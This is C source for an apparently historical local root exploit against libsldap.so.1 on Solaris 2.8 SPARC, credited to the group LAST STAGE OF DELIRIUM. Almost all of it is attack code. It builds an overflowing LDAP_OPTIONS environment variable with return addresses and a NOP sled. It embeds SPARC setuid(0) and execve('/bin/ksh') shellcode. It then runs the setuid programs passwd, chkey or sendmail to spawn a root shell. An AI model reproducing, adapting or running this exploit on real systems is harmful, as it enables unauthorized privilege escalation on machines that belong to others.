/*## copyright LAST STAGE OF DELIRIUM jun 2001 poland        *://lsd-pl.net/ #*/
/*## libsldap.so.1                                                           #*/

#define NOPNUM 16000
#define ADRNUM 512

char setuidcode[]=
    "\x90\x08\x3f\xff"     /* and     %g0,-1,%o0           */
    "\x82\x10\x20\x17"     /* mov     0x17,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
;

char shellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

char jump[]=
    "\x81\xc3\xe0\x08"     /* jmp     %o7+8                */
    "\x90\x10\x00\x0e"     /* mov     %sp,%o0              */
;

static char nop[]="\x80\x1c\x40\x11";

main(int argc,char **argv){
    char buffer[30000],adr[4],*b,*envp[3];
    int i,n=-1;

    printf("copyright LAST STAGE OF DELIRIUM jun 2001 poland  //lsd-pl.net/\n");
    printf("libsldap.so.1 solaris 2.8 sparc\n\n");

    if(argc==1){
         printf("usage: %s {passwd|chkey|sendmail}\n",argv[0]);exit(-1);
    }
    if(!strcmp(argv[1],"passwd")) n=0;
    if(!strcmp(argv[1],"chkey")) n=1;
    if(!strcmp(argv[1],"sendmail")) n=2;
    if(n==-1) exit(-1);

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+14900+8000;

    envp[0]=&buffer[0];
    envp[1]=&buffer[1000];
    envp[2]=0;

    b=&buffer[0];
    sprintf(b,"LDAP_OPTIONS=");
    b+=13;
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    b=&buffer[1000];
    sprintf(b,"xxx=  ");
    b+=4+2;
    for(i=0;i<16000;i++) *b++=nop[i%4];
    for(i=0;i<strlen(setuidcode);i++) *b++=setuidcode[i];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    switch(n){
    case 0: execle("/usr/bin/passwd","lsd",0,envp);
    case 1: execle("/usr/bin/chkey","lsd",0,envp);
    case 2: execle("/usr/lib/sendmail","lsd",0,envp);
    }
}

